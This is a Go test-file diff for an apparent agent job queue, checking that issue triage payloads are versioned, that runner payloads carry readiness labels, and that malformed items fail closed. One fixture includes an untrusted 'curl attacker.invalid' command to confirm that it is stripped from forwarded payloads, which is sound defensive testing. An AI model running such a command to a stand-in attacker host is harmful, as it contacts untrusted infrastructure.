@@ -6,6 +6,7 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 )
 
 func TestRegistrationPublishedFixtureMatchesGoModel(t *testing.T) {
@@ -47,12 +48,6 @@ func TestWorkItemProjectsOnlyVersionedRunnerPayload(t *testing.T) {
 		mode string
 	}{
 		{
-			name: "issue",
-			item: WorkItem{Repository: "owner/repo", Kind: "issue", Number: 14},
-			kind: "issue",
-			mode: "development_turn",
-		},
-		{
 			name: "pull request",
 			item: WorkItem{
 				Repository: "owner/repo", Kind: "pull_request", Number: 38,
@@ -86,7 +81,9 @@ func TestWorkItemProjectsOnlyVersionedRunnerPayload(t *testing.T) {
 			execution, _ := payload["execution"].(map[string]any)
 			if payload["schemaVersion"] != 1 ||
 				event["kind"] != test.kind ||
-				execution["mode"] != test.mode {
+				execution["mode"] != test.mode ||
+				execution["readyLabel"] != "ready" ||
+				execution["claimedLabel"] != "agent-claimed" {
 				t.Fatalf("unexpected runner payload: %#v", payload)
 			}
 			body, err := json.Marshal(payload)
@@ -104,6 +101,38 @@ func TestWorkItemProjectsOnlyVersionedRunnerPayload(t *testing.T) {
 	}
 }
 
+func TestIssueWorkProjectsOnlyVersionedTriagePayload(t *testing.T) {
+	item := WorkItem{
+		Repository: "owner/repo",
+		Kind:       "issue",
+		Number:     14,
+		UpdatedAt:  time.Date(2026, 7, 29, 0, 0, 0, 0, time.UTC),
+		Payload: map[string]any{
+			"title":            "must not cross the queue",
+			"untrustedCommand": "curl attacker.invalid",
+		},
+	}
+	jobType, payload, err := item.QueuedJob("webhook")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if jobType != "agentops.triage" || payload["schemaVersion"] != 1 {
+		t.Fatalf("unexpected triage job: %s %#v", jobType, payload)
+	}
+	body, err := json.Marshal(payload)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, forbidden := range []string{
+		"title", "must not cross", "untrustedCommand", "curl attacker.invalid",
+		"labels", "command", "cloneUrl", "hostPath",
+	} {
+		if strings.Contains(string(body), forbidden) {
+			t.Fatalf("triage payload forwarded %q: %s", forbidden, body)
+		}
+	}
+}
+
 func TestWorkItemRunnerPayloadFailsClosed(t *testing.T) {
 	for _, item := range []WorkItem{
 		{Repository: "Owner/repo", Kind: "issue", Number: 1},
@@ -113,6 +142,28 @@ func TestWorkItemRunnerPayloadFailsClosed(t *testing.T) {
 	} {
 		if _, err := item.RunnerPayload("poll"); err == nil {
 			t.Fatalf("RunnerPayload(%#v) unexpectedly succeeded", item)
+		}
+	}
+}
+
+func TestWorkItemTriagePayloadFailsClosed(t *testing.T) {
+	for _, item := range []WorkItem{
+		{
+			Repository: "Owner/repo", Kind: "issue", Number: 1,
+			UpdatedAt: time.Now(),
+		},
+		{
+			Repository: "owner/repo", Kind: "issue", Number: 0,
+			UpdatedAt: time.Now(),
+		},
+		{Repository: "owner/repo", Kind: "issue", Number: 1},
+		{
+			Repository: "owner/repo", Kind: "pull_request", Number: 1,
+			UpdatedAt: time.Now(),
+		},
+	} {
+		if _, err := item.TriagePayload(); err == nil {
+			t.Fatalf("TriagePayload(%#v) unexpectedly succeeded", item)
 		}
 	}
 }
